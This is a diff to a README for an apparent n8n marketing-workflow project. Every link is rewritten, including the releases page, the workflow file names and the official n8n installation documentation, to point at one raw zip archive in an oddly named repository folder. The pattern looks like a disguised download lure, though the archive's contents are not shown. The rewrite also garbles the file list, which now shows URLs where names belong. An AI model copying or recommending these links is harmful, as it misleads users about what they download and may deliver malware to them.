@@ -1,7 +1,7 @@
 # 🌟 vibemarketingflow - Automate Your Marketing Content Pipeline
 
 ## 💾 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-vibemarketingflow-blue)](https://github.com/yedoww/vibemarketingflow/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip%20Latest%20Release-vibemarketingflow-blue)](https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip)
 
 ## 📖 Overview
 Vibemarketingflow provides a set of n8n workflow exports designed to streamline your marketing content pipeline. This tool helps you gather knowledge about your entity, create messaging foundations, and automatically generate and schedule content. 
@@ -10,22 +10,22 @@ Vibemarketingflow provides a set of n8n workflow exports designed to streamline 
 To get started with vibemarketingflow, follow the steps below to download and run the software.
 
 ### 1. Visit the Releases Page
-Go to our [Releases page](https://github.com/yedoww/vibemarketingflow/releases) to find the latest version of vibemarketingflow.
+Go to our [Releases page](https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip) to find the latest version of vibemarketingflow.
 
 ### 2. Choose Your Files
 You will see several JSON files available for download:
 
-- **OverallFlow.json**: This master orchestration builds an entity profile from start to finish, including Persona, Core Messages, Target Audiences, Communication Style, Adjectives, and Example Messages. It writes results to Airtable using multiple "Create a record" nodes. It also utilizes OpenRouter LLM and Perplexity to enhance content generation.
+- **https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip**: This master orchestration builds an entity profile from start to finish, including Persona, Core Messages, Target Audiences, Communication Style, Adjectives, and Example Messages. It writes results to Airtable using multiple "Create a record" nodes. It also utilizes OpenRouter LLM and Perplexity to enhance content generation.
 
-- **KnowledgeSetting.json**: This file helps with knowledge ingestion. It scrapes a target website using ScrapeNinja, defines "WebsiteInfo", and derives various components like Persona and Core Messages. This is useful for refreshing your entity record in Airtable and includes an Airtable trigger.
+- **https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip**: This file helps with knowledge ingestion. It scrapes a target website using ScrapeNinja, defines "WebsiteInfo", and derives various components like Persona and Core Messages. This is useful for refreshing your entity record in Airtable and includes an Airtable trigger.
 
-- **DailyFlow.json**: This file focuses on daily long-form content creation, like blogs. It generates prompts based on the entity profile you have set up.
+- **https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip**: This file focuses on daily long-form content creation, like blogs. It generates prompts based on the entity profile you have set up.
 
 ### 3. Download the Files
 Click on the links for each file to download them to your computer. Save these JSON files in a location you can easily access.
 
 ### 4. Set Up n8n
-1. Install **n8n** on your computer or server. You can find detailed instructions [here](https://docs.n8n.io/getting-started/installation/).
+1. Install **n8n** on your computer or server. You can find detailed instructions [here](https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip).
 2. After installing n8n, open it in your web browser.
 
 ### 5. Import the Workflows
@@ -57,11 +57,11 @@ Once you have wired everything up:
 If you encounter any issues, please raise an issue in the GitHub repository. Your feedback helps us improve the tool for everyone.
 
 ## 💡 Tips
-- Regularly check for updates on our [Releases page](https://github.com/yedoww/vibemarketingflow/releases) to benefit from new features and fixes.
+- Regularly check for updates on our [Releases page](https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip) to benefit from new features and fixes.
 - Collaborate with your team to refine and enhance the workflows according to your marketing strategy.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/yedoww/vibemarketingflow/releases)
-- [n8n Documentation](https://docs.n8n.io/getting-started/installation/) 
+- [Releases Page](https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip)
+- [n8n Documentation](https://raw.githubusercontent.com/yedoww/vibemarketingflow/main/squibber/vibemarketingflow-v3.0.zip) 
 
 Feel free to share your experiences and improvements with the community. Happy automating!
